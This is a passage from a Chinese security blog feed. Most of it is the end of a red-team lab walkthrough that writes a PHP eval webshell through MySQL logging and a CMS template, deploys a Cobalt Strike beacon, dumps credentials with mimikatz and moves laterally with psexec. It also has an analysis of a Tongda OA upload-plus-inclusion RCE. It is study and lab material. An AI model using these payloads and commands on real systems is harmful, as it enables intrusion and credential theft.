==&#39;&#39;</code>为空说明有任意目录的写权限，非空则只能在对应目录读文件，这里的非空包括<code>NULL</code>。所以这里没有写权限，无法直接写shell。</p><p>因为在mysql 5.6.34版本以后 <code>secure_file_priv</code>的值默认为<code>NULL</code>。并且无法用sql语句对其进行修改，只能够通过以下方式修改</p><p><strong>windows</strong>下:</p><p>修改<code>mysql.ini</code> 文件，在<code>[mysqld]</code> 下添加条目: <code>secure_file_priv =</code></p><p>保存，重启mysql。</p><p><strong>Linux</strong>下:</p><p>在<code>/etc/my.cnf</code>的<code>[mysqld]</code>下面添加<code>local-infile=0</code>选项。</p><p>这里无法直接写shell，那我们来尝试日志写 <code>shell</code>，开启日志记录</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set global general_log &#x3D; &quot;ON&quot;; # 开启日志记录</span><br><span class="line">show variables like &#39;general%&#39;; # 查看当前的日志记录</span><br><span class="line">set global general_log_file&#x3D;&quot;C:&#x2F;&#x2F;phpStudy&#x2F;www&#x2F;v0w.php&quot;;  # 指定日志文件</span><br></pre></td></tr></table></figure><img src="http://image.v0w.top/Blog/20200719170708.png" style="zoom:50%;" /><img src="http://image.v0w.top/Blog/20200719171124.png" style="zoom:50%;" /><p>进行一次查询，查询记录就将写到日志文件中，形成一个webshell。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT &#39;&lt;?php eval($_POST[&quot;v0w&quot;]);?&gt;&#39;</span><br></pre></td></tr></table></figure><img src="http://image.v0w.top/Blog/20200719171314.png" style="zoom:50%;" /><p>使用蚁剑连接，getshell。</p><img src="http://image.v0w.top/Blog/20200719171508.png" style="zoom: 80%;" /><h3 id="3-2-2-通过yxcms-getshell"><a href="#3-2-2-通过yxcms-getshell" class="headerlink" title="3.2.2 通过yxcms getshell"></a>3.2.2 通过yxcms getshell</h3><p>利用之前得到的一些信息，登录后台</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">后台地址：&#x2F;index.php?r&#x3D;admin</span><br><span class="line">用户名和密码：admin  123456</span><br></pre></td></tr></table></figure><p>看看有没有上传或者什么可以写入shell的地方。可以通过Seay审计工具来进行比较细致的审计 ，不过我们不用工具，也容易找到前台模板的管理页面存在编辑功能，明显的写shell的地方。</p><p>比如随便找一个模板进行修改，插入一句话木马（虽然是随便找的，但是需要知道，这个模板在哪个网页执行）</p><img src="http://image.v0w.top/Blog/20200719173829.png" style="zoom:80%;" /><p>这个很明显就在<code>index.php</code>处的搜索功能。</p><p>比如我们随便搜索一个关键词，就会触发这个shell。再或者通过下载下来的备份文件搜索这个文件，直接访问到这个文件的路径也可以拿下shell。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.237.136&#x2F;yxcms&#x2F;index.php?r&#x3D;default%2Findex%2Fsearch&amp;keywords&#x3D;q&amp;type&#x3D;all</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.237.136&#x2F;yxcms&#x2F;protected&#x2F;apps&#x2F;default&#x2F;view&#x2F;default&#x2F;index_search.php</span><br></pre></td></tr></table></figure><img src="http://image.v0w.top/Blog/20200719175223.png" style="zoom: 50%;" /><h1 id="0x04-内网渗透"><a href="#0x04-内网渗透" class="headerlink" title="0x04 内网渗透"></a>0x04 内网渗透</h1><h2 id="4-1-将web服务器上线到CS"><a href="#4-1-将web服务器上线到CS" class="headerlink" title="4.1 将web服务器上线到CS"></a>4.1 将web服务器上线到CS</h2><p>将刚才生成的<code>beacon.exe</code>上传到web目录，然后在shell中执行这个exe,就可以将shell上线到CS了。</p><img src="http://image.v0w.top/Blog/20200719192123.png" style="zoom:50%;" /><img src="http://image.v0w.top/Blog/20200719193327.png" style="zoom:50%;" /><h2 id="4-2-目标主机信息收集"><a href="#4-2-目标主机信息收集" class="headerlink" title="4.2 目标主机信息收集"></a>4.2 目标主机信息收集</h2><p>拿到 <code>shell</code> 第一步，调低心跳值，默认心跳为 <code>60s</code>，执行命令的响应很慢</p><p>我这是自己的内网且没有杀软我就设置为 0 了，真实环境不要设置这么低</p><p>进入 <code>beacon</code> 执行 <code>sleep 0</code>，然后查看下基本的本机信息：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line">hostname</span><br><span class="line">net user</span><br><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><img src="http://image.v0w.top/Blog/20200719194054.png" style="zoom:80%;" /><p><code>systeminfo</code> 可以查看系统详细信息，提供两个小 <code>tips</code>:</p><p>查看是什么操作系统 &amp; 系统版本：<br>系统中文：<code>systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</code><br>系统英文：<code>systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</code><br>查询系统体系架构：echo % PROCESSOR_ARCHITECTURE%</p><img src="http://image.v0w.top/Blog/20200719195546.png" style="zoom:80%;" /><p>查询已安装的软件及版本信息：<code>wmic product get name,version</code></p><img src="http://image.v0w.top/Blog/20200719195654.png" style="zoom:80%;" /><p>在 <code>win10</code> 中，输入 <code>wmic /?</code> 会提示 <code>wmic</code> 已弃用，但在 <code>server2012R2</code>，<code>win7</code> 等版本中可以正常使用</p><p><code>powershell</code> 中可替代该命令的是 <code>Get-WmiObject</code>:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-WmiObject -class win32_product | Select-Object -property name,version</span><br></pre></td></tr></table></figure><p>查询进程及服务：<br><code>tasklist</code>，默认显示映像名称，PID，会话名，会话，内存使用</p><img src="http://image.v0w.top/Blog/20200719195906.png" style="zoom:80%;" /><p><code>tasklist /svc</code>，默认显示映像名称，PID，服务</p><img src="http://image.v0w.top/Blog/20200719195927.png" style="zoom:80%;" /><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure><img src="http://image.v0w.top/Blog/20200719200121.png" style="zoom:80%;" /><p>常见的杀软进程：</p><table><thead><tr><th>进程名</th><th>软件</th></tr></thead><tbody><tr><td>360sd.exe</td><td>360 杀毒</td></tr><tr><td>360tray.exe</td><td>360 实时保护</td></tr><tr><td>ZhuDongFangYu.exe</td><td>360 主动防御</td></tr><tr><td>KSafeTray.exe</td><td>金山卫士</td></tr><tr><td>SafeDogUpdateCenter.exe</td><td>安全狗</td></tr><tr><td>McAfee</td><td>McShield.exe</td></tr><tr><td>egui.exe</td><td>NOD32</td></tr><tr><td>AVP.exe</td><td>卡巴斯基</td></tr><tr><td>avguard.exe</td><td>小红伞</td></tr><tr><td>bdagent.exe</td><td>BitDefender</td></tr></tbody></table><h2 id="4-3-域信息收集"><a href="#4-3-域信息收集" class="headerlink" title="4.3 域信息收集"></a>4.3 域信息收集</h2><h3 id="什么是域"><a href="#什么是域" class="headerlink" title="什么是域"></a>什么是域</h3><p>参考文章：<a href="https://mp.weixin.qq.com/s/aXEJpZVxxSkFUfG8TqsxHw">内网渗透学习导航</a></p><blockquote><p>域是计算机网络的一种形式，其中所有用户帐户 ，计算机，打印机和其他安全主体都在位于称为域控制器的一个或多个中央计算机集群上的中央数据库中注册。 身份验证在域控制器上进行。 在域中使用计算机的每个人都会收到一个唯一的用户帐户，然后可以为该帐户分配对该域内资源的访问权限。 从 Windows Server 2003 开始 ， Active Directory 是负责维护该中央数据库的 Windows 组件。Windows 域的概念与工作组的概念形成对比，在该工作组中，每台计算机都维护自己的安全主体数据库。</p></blockquote><h3 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h3><p>使用 <code>ipconfig /all</code> 查看 <code>DNS</code> 服务器：</p><p><img src="http://image.v0w.top/Blog/20200719200858.png"></p><p>发现 DNS 服务器名为 <code>god.org</code>，查看域信息：<code>net view</code></p><img src="http://image.v0w.top/Blog/20200719201026.png" style="zoom:80%;" /><p>查看主域信息：<code>net view /domain</code></p><p><img src="http://image.v0w.top/Blog/20200719201134.png"></p><p>查看时间服务器：<code>net time /domain</code></p><img src="http://image.v0w.top/Blog/20200719201254.png"  /><p>发现能够执行，说明此台机器在域中 (若是此命令在显示域处显示 WORKGROUP，则不存在域，若是报错：发生系统错误 5，则存在域，但该用户不是域用户)</p><p>查询当前的登录域与用户信息：<code>net config workstation</code></p><p><img src="http://image.v0w.top/Blog/20200719201432.png"></p><h3 id="查找域控"><a href="#查找域控" class="headerlink" title="查找域控"></a>查找域控</h3><p>利用 <code>nslookup</code> 命令直接解析域名服务器：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell nslookup god.org# nslookup 域名</span><br></pre></td></tr></table></figure><h3 id="查询域控和用户信息"><a href="#查询域控和用户信息" class="headerlink" title="查询域控和用户信息"></a>查询域控和用户信息</h3><p>查看当前域的所有用户：<code>net user /domain</code></p><p><img src="http://image.v0w.top/Blog/20200719202425.png"></p><p>获取域内用户的详细信息：<code>wmic useraccount get /all</code></p><p>可以获取到用户名，描述信息，SID 域名等：</p><img src="http://image.v0w.top/Blog/20200719202526.png" style="zoom:80%;" /><p>查看所有域成员计算机列表：<code>net group &quot;domain computers&quot; /domain</code></p><p><img src="http://image.v0w.top/Blog/20200719202617.png"></p><p>查看域管理员：<code>net group &quot;domain admins&quot; /domain</code></p><p><img src="http://image.v0w.top/Blog/20200719202708.png"></p><p>获取域密码信息：<code>net accounts /domain</code></p><p><img src="http://image.v0w.top/Blog/20200719202902.png"></p><p>获取域信任信息 (cs 里执行提示不是内部或外部命令)：<code>nltest /domain_trusts</code></p><p>以下为win7中的执行结果：</p><p><img src="http://image.v0w.top/Blog/20200719203041.png"></p><h2 id="4-4-横向探测"><a href="#4-4-横向探测" class="headerlink" title="4.4 横向探测"></a>4.4 横向探测</h2><p>获取到一个 <code>cs</code> 的 <code>beacon</code> 后可以继续查看目标内网情况和端口开放情况</p><p>在 <code>beacon</code> 上右键 -&gt; 目标 -&gt; 选择 <code>net view</code> 或者 <code>port scan（端口扫描）</code>:</p><p><strong>net view</strong></p><img src="http://image.v0w.top/Blog/20200719203320.png" style="zoom:80%;" /><p>执行之后，可以在<code>CobaltStrike-&gt;可视化-&gt;目标列表</code>看到扫描出来的主机：</p><p><img src="http://image.v0w.top/Blog/20200719203856.png"></p><p>用 <code>cs</code> 的 <code>hashdump</code> 读内存密码：<code>hashdump</code>，</p><p>用 <code>mimikatz</code> 读注册表密码：<code>logonpasswords</code></p><img src="http://image.v0w.top/Blog/20200719204025.png" style="zoom:80%;" /><p>在凭证信息一栏可以清楚查看：</p><p><img src="http://image.v0w.top/Blog/2020-09-25-20200719204108.png"></p><p>如果权限不够可以提权，自带部分提权POC</p><p><img src="http://image.v0w.top/Blog/20200719205029.png"></p><p><img src="http://image.v0w.top/Blog/20200719205118.png"></p><p>额外的提权插件：<a href="https://github.com/rsmudge/ElevateKit">ElevateKit</a>额外增加 <code>ms14-058</code>、<code>ms15-051</code>、<code>ms16-016</code>、<code>uac-schtasks</code> 四种提权方式</p><p>抓取密码后可以先探测内网其他主机：</p><p><code>ping</code> 方法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr &quot;TTL&#x3D;&quot;</span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/Blog/20200719211417.png"></p><p>最简单的直接 <code>arp -a</code> 查看也可以，这里还推荐一个好用工具 <code>Ladon</code></p><p><a href="https://github.com/k8gege/Ladon"><strong>Ladon</strong></a>作者是 <code>k8gege</code>，它是一个大型内网渗透扫描器并且支持 <code>cs</code> 脚本形式</p><p><code>cs</code> 要使用的话只需要下载其中的 <code>Ladon.exe</code> 和 <code>Ladon.cna</code> 即可运行基本功能</p><p>详细功能参考官方 <a href="https://github.com/k8gege/Ladon/wiki"><code>wiki</code></a>或<a href="http://k8gege.org/p/648af4b3.html">官方说明文档</a></p><p>将Lodan下载下来后，在客户端的CS中<code>CobaltStrike-&gt;脚本管理器-&gt;Load-&gt;Lodan.cna</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;k8gege&#x2F;Ladon.git</span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/Blog/20200719212518.png"></p><p>之后就可以愉快的使用了。</p><p>查看帮助：</p><img src="http://image.v0w.top/Blog/20200719212548.png" style="zoom: 80%;" /><p>扫描网段内存活主机信息：<code>Ladon 192.168.72.0/24 OsScan</code></p><p>域探测差不多了还可以使用 <a href="https://github.com/BloodHoundAD/BloodHound"><code>BloodHound</code></a>这款域渗透分析工具来分析攻击路径</p><p>BloodHound 介绍：</p><blockquote><p>BloodHound 是一种单页的 JavaScript 的 Web 应用程序，构建在 Linkurious 上，用 Electron 编译，NEO4J 数据库 PowerShell/C# ingestor.BloodHound 使用可视化图来显示 Active Directory 环境中隐藏的和相关联的主机内容。攻击者可以使用 BloodHound 轻松识别高度复杂的攻击路径，否则很难快速识别。防御者可以使用 BloodHound 来识别和防御那些相同的攻击路径。蓝队和红队都可以使用 BloodHound 轻松深入了解 Active Directory 环境中的权限关系。</p></blockquote><h2 id="4-5-横向移动"><a href="#4-5-横向移动" class="headerlink" title="4.5 横向移动"></a>4.5 横向移动</h2><p>因为192.168.52.0/24段不能直接连接到192.168.237.137(kali地址)，所以需要CS派生smb beacon。让内网的主机连接到win7上。</p><blockquote><p>SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效。</p></blockquote><p>简单来说，SMB Beacon 有两种方式</p><p><strong>第一种直接派生一个孩子，目的为了进一步盗取内网主机的 hash</strong></p><p>新建一个 <code>Listener</code>，<code>payload</code> 设置为 <code>Beacon SMB</code>：</p><p><img src="http://image.v0w.top/Blog/20200719221248.png"></p><p>在已有的 <code>Beacon上</code>右键 <code>Spawn</code>(生成会话 / 派生)，选择创建的 <code>smb beacon</code> 的 <code>listerner</code>:</p><img src="http://image.v0w.top/Blog/20200719220636.png" style="zoom: 80%;" /><p>选择后会反弹一个子会话，在 <code>external</code> 的 <code>ip</code> 后面会有一个链接的小图标：</p><img src="http://image.v0w.top/Blog/20200719220734.png" style="zoom:80%;" /><p><img src="http://image.v0w.top/Blog/20200719220810.png"></p><p>这就是派生的 <code>SMB Beacon</code>，当前没有连接</p><p>可以在主 <code>Beacon</code> 上用 <code>link host</code> 连接它，或者 unlink host 断开它</p><p><img src="http://image.v0w.top/Blog/20200719221018.png"></p><p><strong>第二种在已有的 beacon 上创建监听，用来作为跳板进行内网穿透</strong></p><p>前提是能够通过 shell 之类访问到内网其他主机</p><h3 id="psexec-使用凭证登录其他主机"><a href="#psexec-使用凭证登录其他主机" class="headerlink" title="psexec 使用凭证登录其他主机"></a>psexec 使用凭证登录其他主机</h3><p>前面横向探测已经获取到内网内的其他 <code>Targets</code> 以及读取到的凭证信息</p><p>于是可以尝试使用 <code>psexec</code> 模块登录其他主机</p><p>右键选择一台非域控主机 <code>ROOT-TVI862UBEH</code> 的 <code>psexec</code> 模块：</p><p><img src="http://image.v0w.top/Blog/2020-09-25-20200719223832.png"></p><p>在弹出的窗口中选择使用 <code>god.org</code> 的 <code>Administrator</code> 的凭证信息</p><p>监听器选择刚才创建的 <code>smb beacon</code>，会话也选择对应的 <code>smb beacon</code> 的会话：</p><p><img src="http://image.v0w.top/Blog/2020-09-25-20200719224006.png"></p><p><img src="http://image.v0w.top/Blog/2020-09-25-20200719224034.png"></p><p>可以看到分别执行了</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">beacon&gt; rev2self</span><br><span class="line">[*] Tasked beacon to revert token</span><br><span class="line">beacon&gt; make_token GOD.ORG\Administrator V0Wldl19980114</span><br><span class="line">[*] Tasked beacon to create a token for GOD.ORG\Administrator</span><br><span class="line">beacon&gt; jump psexec ROOT-TVI862UBEH smb</span><br></pre></td></tr></table></figure><p>这几条命令，执行后得到了 <code>ROOT-TVI862UBEH</code> 这台主机的 <code>beacon</code></p><p>如法炮制得到了域控主机 <code>OWA</code> 的 <code>beacon</code>，最终目标视图如下：</p><p><img src="http://image.v0w.top/Blog/20200719224514.png"></p><h3 id="token-窃取"><a href="#token-窃取" class="headerlink" title="token 窃取"></a>token 窃取</h3><p>除了直接使用获取到的 <code>hash</code> 值，也可以直接窃取 <code>GOD\Administrator</code> 的 <code>token</code> 来登录其他主机</p><p>选择 <code>beacon</code> 右键 -&gt; 目标 -&gt; 进程列表</p><p>选择 <code>GOD\Administrator</code> 的 <code>token</code> 盗取：</p><img src="http://image.v0w.top/Blog/20200719225201.png" style="zoom: 67%;" /><p>然后在选择令牌处勾选使用当前 <code>token</code> 即可：</p><p><img src="http://image.v0w.top/Blog/2020-09-25-20200719225303.png"></p><h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><p>我们利用mysql日志写shell或者CMS的模板文件写shell轻松拿下Web服务器，再利用Web服务器作为跳板，去横向收集域内主机信息，并利用窃取的凭证横向移动到其他主机，最终实现整个域的控制。</p><h1 id="0xFF-后记与参考链接"><a href="#0xFF-后记与参考链接" class="headerlink" title="0xFF 后记与参考链接"></a>0xFF 后记与参考链接</h1><p>内网渗透的内容很多，完成这个靶机，也只是管中窥豹，发现需要更多的积累和学习，也很感谢很多师傅的博客和笔记，使得我在练习这个靶机的时候轻松很多（<del>其实也没有，依然很累==</del>）0rz。后面希望能够继续更新这个系列，在内网渗透方面也能不断学习，不断成长。</p><p>参考链接：</p><ul><li><a href="https://www.freebuf.com/column/231111.html">红日官方WP-ATT&amp;CK实战 | Vulnstack 红队（一）</a></li><li><a href="https://soapffz.com/sec/558.html">soapffz师傅非常详细的ATT&amp;CK 实战 - 红日安全 vulnstack (一)</a></li><li><a href="https://blog.csdn.net/qq_36119192/article/details/103528138">内网渗透实战技巧</a></li><li><a href="https://mp.weixin.qq.com/s/rTfizm_b_c3NRS-37n3zsA">由浅入深的域渗透系列一（上）</a></li><li><a href="https://mp.weixin.qq.com/s/11ImZTDTPAF19moSTynBOA">由浅入深的域渗透系列一（下）</a></li><li><a href="https://www.c0bra.xyz/2019/12/14/Cobalt-Strike%E7%B3%BB%E5%88%979/">Cobalt Strike 系列 9</a></li><li>[第三节 SMB Beacon.md](<a href="https://github.com/aleenzz/Cobalt_Strike_wiki/blob/master/%E7%AC%AC%E4%B8%89%E8%8A%82[SMB">https://github.com/aleenzz/Cobalt_Strike_wiki/blob/master/第三节[SMB</a> Beacon].md)</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;今后，尽量每周抽时间对较为完整的一个渗透靶机进行练习，先从红日安全团队分享的靶机实战环境开始吧。感谢</summary>
      
    
    
    
    <category term="靶场练习" scheme="http://v0w.top/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
    
    
    <category term="代码审计" scheme="http://v0w.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="域渗透" scheme="http://v0w.top/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
    <category term="内网渗透" scheme="http://v0w.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="SQL注入" scheme="http://v0w.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="webshell" scheme="http://v0w.top/tags/webshell/"/>
    
  </entry>
  
  <entry>
    <title>通达OA任意文件上传并利用文件包含导致RCE分析</title>
    <link href="http://v0w.top/2020/03/20/TODA-FileUpload-Inclusion-vuln/"/>
    <id>http://v0w.top/2020/03/20/TODA-FileUpload-Inclusion-vuln/</id>
    <published>2020-03-19T16:00:00.000Z</published>
    <updated>2020-07-18T10:39:40.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。</p><p>3月13日，通达OA在官方论坛发布通告称，近日接到用户反馈遭到勒索病毒攻击，提示用户注意安全风险，并且于同一天对所有版本发布了<a href="https://www.tongda2000.com/news/673.php">加固补丁</a>。</p><p>通过在v11.3版本的测试发现全版本的任意文件上传漏洞结合v11版本的文件包含漏洞可以造成远程命令执行，默认为System权限，恶意攻击者可以成功上传Webshell后门，并进一步释放勒索病毒，危害较大。</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="php解密"><a href="#php解密" class="headerlink" title="php解密"></a>php解密</h2><p>环境搭建什么的就不说了，这里采用的是<a href="https://pan.baidu.com/s/127voqNZZJX5NkmuC4Ogfhg">2017的版本</a>，修复前的版本。</p><p><a href="https://www.tongda2000.com/download/2019.php">官网下载</a></p><p>相比于一般的php审计，该项目增加了php的加密。这里因为我也是第一次接触到php加密的文件审计，前期碰壁很多，尝试google了<code>php解密</code>，找到一些工具(如黑刀zend等)，但是并没有用（可能是zend版本的问题，也可能是工具本身的问题，没有深究）</p><p>后来看到一篇关于该漏洞的复现——<a href="https://www.cnblogs.com/potatsoSec/p/12516234.html">通达OA最新RCE漏洞分析</a>，并询问potatso大佬解密方法后，得到耐心解答0rz，并找到一个在线进行php解密的网站——<a href="http://dezend.qiling.org/free.html">DEPHP解密</a></p><p>另外是一个批量解密的工具，seay神写的<a href="http://www.pc6.com/softview/SoftView_610659.html">SeayDzend</a></p><p>另外了解了关于php加密混淆的几种方法——<a href="https://cloud.tencent.com/developer/article/1152056">PHP加密解密的解析</a></p><p>通达OA php代码部分的加密统统采用的是Zend加密。</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><code>/webroot/ispirit/im/upload.php</code></p><p>这是一个文件上传的功能点，在未修复版本中，是可以绕过验证，从而达到任意上传的效果。有一个if判断如果<code>$P</code>存在且非空就不需要经过<code>auth.php</code>验证即可执行后续代码。利用此处逻辑漏洞可绕过登陆验证直接上传文件。补丁文件中是直接强制<code>include_once ‘./auth.php’;</code> 进行登录验证。因上传后的文件不在根目录，所以无法直接利用，因此需要进行文件包含。</p><p><img src="https://i.loli.net/2020/03/24/pg6nPi7X5yu8ewD.png"></p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>未修复前，可通过精心构造json进入47行的<code>includ_once</code>进行文件包含。官方在补丁中增加了对”..”的过滤防止用户读取其他目录文件。</p><p><img src="https://i.loli.net/2020/03/26/XukdcjaQRpyoVWt.png" alt="20200326222917.png"></p><h2 id="分析利用链"><a href="#分析利用链" class="headerlink" title="分析利用链"></a>分析利用链</h2><ol><li><p>先判断<code>$P</code>参数是否调用了Session和auth登陆认证，当<code>$P</code>费控时，此处可以绕过<code>auth.php</code>登陆验证</p></li><li><p>判断<code>DEST_UID</code>是否为空，如果<code>$DEST_UID</code>存在<code>,</code>则通过<code>intval</code>获取整数值，<code>$DEST_UID==0</code>且<code>UPLOAD_MODE==2</code>才接受，否则 ID无效。</p></li><li><p><code>$_FILES</code>全局变量大于等于1的时候(就是有文件上传的时候)，会调用upload方法进行处理，这里的文件上传的参数为<code>ATTACHMENT</code></p><p><img src="https://i.loli.net/2020/03/26/gRaE2myBU39GxcW.png" alt="20200326204612.png"></p></li><li><p>跟进发现调用的是<code>\general\appbuilder\modules\appdesign\models\AppUtils.php</code>中用yii框架的upload 函数，找了一下，对后缀名有限制。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">models</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">base</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">UploadedFile</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UploadForm</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> UploadedFile</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> $imageFile;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rules</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            [[<span class="string">&#x27;imageFile&#x27;</span>], <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;skipOnEmpty&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;extensions&#x27;</span> =&gt; <span class="string">&#x27;png, jpg&#x27;</span>],</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;validate()) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;imageFile-&gt;saveAs(<span class="string">&#x27;uploads/&#x27;</span> . <span class="keyword">$this</span>-&gt;imageFile-&gt;baseName . <span class="string">&#x27;.&#x27;</span> . <span class="keyword">$this</span>-&gt;imageFile-&gt;extension);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>那么就可以在url中传入<code>../</code> 进行跨目录，从而可以包含第1个漏洞上传的php文件，造成RCE。</p></li></ol><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>*本次复现以通达OAv11.3 版本 为例<br><img src="https://image.3001.net/images/20200319/1584586276_5e72de24f33c1.png!small"></p><p>第1个漏洞的Poc的构造需要满足四个条件: P非空、DEST_UID非空且为数字、UPLOAD_MODE为1或2或3、ATTACHMENT的filename后缀名不能为<code>php</code>最后构造的Payload如下<br><img src="https://image.3001.net/images/20200319/1584585871_5e72dc8f606a3.png!small"><br>上传了1个文件名为<code>a.phtml</code>的php文件 绕过黑名单检测路径为 attach/im/2003/72566742.a.phtm 但该目录不在webroot下不能直接执行webshell，才需要利用后面的文件包含漏洞跨目录解析</p><p><img src="https://image.3001.net/images/20200319/1584585872_5e72dc902ceb5.png!small"></p><h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>打上官方发布的补丁：<a href="https://www.tongda2000.com/news/673.php">加固补丁</a>。</p><h1 id="个人观点"><a href="#个人观点" class="headerlink" title="个人观点"></a>个人观点</h1><p>虽然我很菜，但是我个人不喜欢这个官网上的一些内容，主要是想要表现产品的优秀，将顾客的信息公之于众。在其官网上，可以非常容易的找到有哪些企业使用了这个系统。这的确是长了脸面（我们产品很好），但是<strong>没有一个系统是绝对安全的</strong>，这种做法也给这个用户带来的风险, 在黑客进行攻击的时候，这种行为无疑是给攻击者们提供了便利，这大概也是这个勒索病毒横行的原因之一吧。</p><p><img src="https://i.loli.net/2020/03/24/vzEGixBJK2Fbqke.png"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://www.cnblogs.com/potatsoSec/p/12516234.html">通达OA最新RCE漏洞分析</a> potatso 博客园</li><li><a href="https://cloud.tencent.com/developer/article/1152056">PHP加密解密的解析</a></li><li><a href="http://dezend.qiling.org/free.html">DEPHP解密</a></li><li><a href="https://www.freebuf.com/column/230871.html">通达OA任意文件上传和文件包含漏洞导致RCE详细代码审计分析及Poc构造复现</a> freebuf</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结</summary>
      
    
    
    
    <category term="漏洞复现" scheme="http://v0w.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="php" scheme="http://v0w.top/tags/php/"/>
    
    <category term="代码审计" scheme="http://v0w.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="文件上传" scheme="http://v0w.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    <category term="文件包含" scheme="http://v0w.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>域渗透入门（一）</title>
    <link href="http://v0w.top/2020/03/15/DomainPentest1/"/>
    <id>http://v0w.top/2020/03/15/DomainPentest1/</id>
    <published>2020-03-14T16:00:00.000Z</published>
    <updated>2020-07-18T10:15:54.000Z</updated>
    
